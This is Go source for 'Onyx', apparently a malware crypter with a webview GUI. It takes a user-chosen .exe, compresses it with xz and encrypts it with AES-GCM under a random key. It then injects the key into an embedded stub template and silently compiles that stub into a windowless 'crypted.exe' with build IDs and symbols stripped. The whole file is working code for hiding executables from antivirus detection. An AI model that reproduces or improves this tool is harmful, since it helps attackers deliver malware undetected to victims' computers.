package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	_ "embed"
	"encoding/hex"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"github.com/sqweek/dialog"
	"github.com/ulikunitz/xz"
	webview "github.com/webview/webview_go"
)

//go:embed lib/index.html
var html string

//go:embed lib/crypt.req
var buildData []byte

var chosenFile string

func encrypt(data, key []byte) []byte {
	aesBlock, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(aesBlock)

	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)

	return gcm.Seal(nonce, nonce, data, nil)
}

func compress(data []byte) []byte {
	var buff bytes.Buffer
	writer, _ := xz.NewWriter(&buff)
	writer.Write(data)
	writer.Close()

	return buff.Bytes()
}

func getRandomKey() []byte {
	key := make([]byte, 16)
	rand.Read(key)

	hexKey := hex.EncodeToString(key)
	return []byte(hexKey)
}

func run(name string, args ...string) {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}

func compile(filename string) {
	run("go.exe", "mod", "init", "build")
	run("go.exe", "mod", "tidy")
	run("go.exe", "build", "--ldflags", "-s -w -H windowsgui -buildid=", filename)
}

func build(data []byte) []byte {
	os.Mkdir("temp", 0644)
	os.Chdir("temp")
	os.WriteFile("payload.tmp", data, 0644)
	os.WriteFile("build.go", buildData, 0644)

	compile("build.go")

	data, _ = os.ReadFile("build.exe")
	os.Chdir("..")
	return data
}

func crypt() {
	savepath, err := dialog.File().Filter("Executable Files", "exe").Title("Save crypted file").SetStartFile("crypted.exe").Save()
	if err != nil {
		return
	}
	key := getRandomKey()
	buildData = []byte(strings.Replace(string(buildData), "<KEY>", string(key), 1))

	data, _ := os.ReadFile(chosenFile)
	data = compress(data)
	data = encrypt(data, key)
	data = build(data)

	os.WriteFile(savepath, data, 0644)
	exec.Command("explorer.exe", filepath.Dir(savepath)).Start()
}

func main() {
	w := webview.NewWindow(false, nil)
	w.SetSize(470, 520, webview.HintFixed)
	w.SetTitle("Onyx | Main")
	w.SetHtml(html)

	w.Bind("selectFile", func() string {
		filename, err := dialog.File().Filter("Executable Files", "exe").Title("Select a file").Load()
		if err != nil {
			chosenFile = ""
			return "No file chosen"
		}
		chosenFile = filename
		return filename
	})

	w.Bind("cryptFile", func() {
		go crypt()
	})

	w.Run()
}
